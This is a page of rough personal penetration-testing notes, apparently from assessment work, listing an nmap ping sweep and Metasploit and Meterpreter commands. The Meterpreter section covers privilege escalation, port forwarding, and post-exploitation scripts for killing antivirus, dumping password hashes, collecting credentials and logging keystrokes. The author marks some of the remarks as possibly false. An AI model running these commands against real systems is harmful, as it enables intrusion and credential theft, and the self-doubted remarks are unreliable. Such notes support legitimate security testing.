---
title: CISA
---

# Cybersecurity and Infrastructure Security Agency (CISA)
[CISA-RVA Tools](./recon).
## These are really rough notes.. fyi

## NMAP
###### Ping Sweep
```
nmap -n -sn <x.x.x.x/xx or x.x.x.x-xxx> -oG - | awk '/Up$/{print $2}'
```
## Metasploit
###### Commands
```
show targets
show options
```

## Meterpreter
Suggest post exploitation paths
```
run post/multi/recon/local_exploit_suggester
```
Get Administrator
```
getsystem
```
Drop into a command prompt
```
shell
```

Creates relay from a meterpreter session
```
portfwd add -l 22 -p 22 -r 10.20.170.87
```

###### Systeminfo
Check the system and current process that the session is running as. I had an issue where the exploit gave me a x86 (WOW64 32 bit) shell and the privesc needed x64 (64bit).
^ This statement might be completely false lol ^
```
sysinfo
```

###### I am not sure if this migrated me to a (x86) process.
```
run post/windows/manage/migrate
```

###### Core Commands
Background the meterpreter session
```
background
```

Meterpreter Scripts
```
killav
metsvc
migrate
netenum
prefetchtool
vnc_oneport / vnc
sheduleme
winenum
credcollect
get_local_subnets
getcountermeasure
getgui
gettelnet
hashdump
keylogrecorder
checkvm
```
